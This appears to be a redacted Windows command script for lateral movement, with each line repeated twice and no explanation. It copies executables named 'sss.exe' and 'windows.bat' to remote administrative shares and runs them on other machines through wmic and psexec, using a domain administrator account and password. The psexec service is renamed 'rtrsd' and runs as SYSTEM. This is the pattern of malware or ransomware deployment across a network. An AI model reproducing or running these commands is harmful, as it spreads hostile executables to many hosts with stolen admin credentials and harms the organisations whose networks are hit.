start copy sss.exe \\<internal IP>\c$\windows\temp\
start copy sss.exe \\<internal IP>\c$\windows\temp\

start copy windows.bat \\<internal IP>\c$\windows\temp\
start copy windows.bat \\<internal IP>\c$\windows\temp\

start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "c:\windows\temp\sss.exe"
start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "c:\windows\temp\sss.exe"

start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "cmd.exe /c c:\windows\temp\windows.bat"
start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "cmd.exe /c c:\windows\temp\windows.bat"

start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "cmd.exe /c copy \\<internal IP>\c$\windows\temp\sss.exe c:\windows\temp\"
start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "cmd.exe /c copy \\<internal IP>\c$\windows\temp\sss.exe c:\windows\temp\"

start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "cmd.exe /c copy \\<internal IP>\c$\windows\temp\windows.bat c:\windows\temp\"
start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "cmd.exe /c copy \\<internal IP>\c$\windows\temp\windows.bat c:\windows\temp\"
start psexec.exe \\<internal IP> -u <DOMAIN\adminaccount> -p "<password>" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
start psexec.exe \\<internal IP> -u <DOMAIN\adminaccount> -p "<password>" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
start psexec.exe \\<internal IP> -u <DOMAIN\adminaccount> -p "<password>" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\windows.bat
start psexec.exe \\<internal IP> -u <DOMAIN\adminaccount> -p "<password>" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\windows.bat
